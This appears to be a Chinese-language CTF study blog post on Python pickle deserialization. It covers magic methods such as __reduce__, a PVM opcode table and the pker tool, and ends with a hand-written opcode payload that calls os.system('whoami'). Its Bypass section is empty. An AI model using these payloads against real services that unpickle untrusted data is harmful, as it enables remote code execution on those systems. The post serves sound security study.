---
title: Pickle反序列化初探
date: 2026-05-08 20:03:31
tags:
categories: CTF
---

第三次纳新有一个pickle反序列化，现在我们来系统学习一下

## 魔术方法

```python
class Demo:
    def __init__(self):
        print("对象被创建")

    def __del__(self):
        print("对象被销毁")

    def __str__(self):
        return "Demo对象"

    def __reduce__(self):
        # Pickle反序列化时会调用此方法
        print("__reduce__ 被调用")
        return (eval, ("print('RCE!')",))

obj = Demo()
print(obj)  # 调用 __str__
```

- `__init__`：构造函数，创建对象时调用。
- `__del__`：析构函数，对象销毁时调用。
- `__str__`：转为字符串时调用。
- `__reduce__`：Pickle 序列化时调用。
- `__reduce_ex__`：`__reduce__` 的新版本，会先于 `__reduce__` 调用，如果不存在才调用 `__reduce__`。
- `__setstate__`：pickle模块中，反序列化时恢复对象状态。

## 重要内置函数

```python
# eval: 执行字符串形式的 Python 表达式
eval("1+1")
eval("'hello'.upper()")
eval("__import__('os').system('whoami')")

# exec: 执行字符串形式的 Python 代码块
exec("import os; os.system('ls')")
exec("""
for i in range(3):
    print(i)
""")

# __import__: 动态导入模块
os = __import__('os')
os.system('whoami')

# getattr: 获取对象属性
import os
func = getattr(os, 'system') # 相当于 os.system
func('whoami') # os.system("whoami")
```

## Pickle

### 基本用法

在python中，我们使用pickle这样一个模块进行序列化和反序列化的操作

1. `pickle.dump()`
2. `pickle.load()`
3. `pickle.dumps()`
4. `pickle.loads()`

其中两个dump函数是把python对象转换为二进制对象的,两个load函数是把二进制对象转换为python对象的.

而s函数是指对字符串进行反序列化和序列化操作,另外两个函数是对文件进行操作.

###  PVM 的核心：栈与存储

Pickle 的本质不是一种数据格式（像 JSON），而是一种**基于栈的指令集语言**。

PVM 运行的时候只有两个关键区域：

- **栈 (Stack)**：绝大多数指令都在这里发生。数据压入栈，指令弹出数据并处理。
- **备忘录 (Memo)**：一个索引数组，用来存储对象的引用。主要为了解决循环引用（比如一个列表里包含了它自己）。

------

### 常用操作码（Opcodes）详解

要实现手动编写 payload，你只需要掌握这几个核心指令：

| 指令 | 描述                                                         | 具体写法                                           | 栈上的变化                                                   |
| ---- | ------------------------------------------------------------ | -------------------------------------------------- | ------------------------------------------------------------ |
| c    | 获取一个全局对象或import一个模块                             | c[module]\n[instance]\n                            | 获得的对象入栈                                               |
| o    | 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） | o                                                  | 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 |
| i    | 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） | i[module]\n[callable]\n                            | 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 |
| N    | 实例化一个None                                               | N                                                  | 获得的对象入栈                                               |
| S    | 实例化一个字符串对象                                         | S'xxx'\n（也可以使用双引号、\'等python字符串形式） | 获得的对象入栈                                               |
| V    | 实例化一个UNICODE字符串对象                                  | Vxxx\n                                             | 获得的对象入栈                                               |
| I    | 实例化一个int对象                                            | Ixxx\n                                             | 获得的对象入栈                                               |
| F    | 实例化一个float对象                                          | Fx.x\n                                             | 获得的对象入栈                                               |
| R    | 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 | R                                                  | 函数和参数出栈，函数的返回值入栈                             |
| .    | 程序结束，栈顶的一个元素作为pickle.loads()的返回值           | .                                                  | 无                                                           |
| (    | 向栈中压入一个MARK标记                                       | (                                                  | MARK标记入栈                                                 |
| t    | 寻找栈中的上一个MARK，并组合之间的数据为元组                 | t                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 |
| )    | 向栈中直接压入一个空元组                                     | )                                                  | 空元组入栈                                                   |
| l    | 寻找栈中的上一个MARK，并组合之间的数据为列表                 | l                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 |
| ]    | 向栈中直接压入一个空列表                                     | ]                                                  | 空列表入栈                                                   |
| d    | 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） | d                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 |
| }    | 向栈中直接压入一个空字典                                     | }                                                  | 空字典入栈                                                   |
| p    | 将栈顶对象储存至memo_n                                       | pn\n                                               | 无                                                           |
| g    | 将memo_n的对象压栈                                           | gn\n                                               | 对象被压栈                                                   |
| 0    | 丢弃栈顶对象                                                 | 0                                                  | 栈顶对象被丢弃                                               |
| b    | 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 | b                                                  | 栈上第一个元素出栈                                           |
| s    | 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 | s                                                  | 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 |
| u    | 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 | u                                                  | MARK标记以及被组合的数据出栈，字典被更新                     |
| a    | 将栈的第一个元素append到第二个元素(列表)中                   | a                                                  | 栈顶元素出栈，第二个元素（列表）被更新                       |
| e    | 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 | e                                                  | MARK标记以及被组合的数据出栈，列表被更新                     |

## Pker工具

手写opcode操作码非常麻烦并且不好理解，有一个pker工具进行了封装，可以实现大部分的功能

pker支持这三种操作

- 变量赋值：
  - 左值可以是变量名，dict或list的item，对象成员
  - 右值可以是基础类型字面量，函数调用
- 函数调用
- return：可返回0~1个参数

pker内置了三种函数

```python
GLOBAL('os', 'system') #从模块中导入一个函数或者从全局对象中获取一个属性
INST('os', 'system', 'ls') #建立并入栈一个对象（可以执行一个函数）
OBJ(GLOBAL('os', 'system'), 'ls') #建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数）
```

那么，INST和OBJ有什么区别？？？

![image-20260512142022984](https://gitee.com/bobrocket/img/raw/master/image-20260512142022984.png)

return可以返回一个对象

```
return           =>  .
return var       =>  g_\n.
return 1         =>  I1\n.
```

## 常见用法

下面介绍几种常见的打法以及如何用pker工具实现

我们来看一个完全没有保护的pickle反序列化

```python
payload = b''

import pickle
# 模拟后端接收并反序列化
try:
    pickle.loads(payload)
except Exception as e:
    print(f"执行结果（可能因系统差异有别）: {e}")
```

### 打法一：基础 RCE

```
cos             # 导入 os 模块
\nsystem        # 获取 system 函数
\n(             # 压入 MARK 标记
S'whoami'       # 压入字符串参数 'whoami'
\nt             # 将 MARK 到栈顶的内容转为元组 ('whoami',)
R               # 执行栈顶函数（system）并传入栈顶参数（元组）
.               # 结束
```

```
payload=b'cos\nsystem\n(S\'whoami\'\ntR.'
```

下面有三种pker的实现方式

```python
func=GLOBAL('os','system')
func('whoami')"

INST('os', 'system', 'whoami')

OBJ(GLOBAL('os', 'system'), 'whoami')
```

### 打法二：修改变量

可以参考第三次纳新

## Bypass





## Reference

[pickle反序列化漏洞基础知识与绕过简析-先知社区](https://xz.aliyun.com/news/13498)

[pickle反序列化初探-先知社区](https://xz.aliyun.com/news/7032)
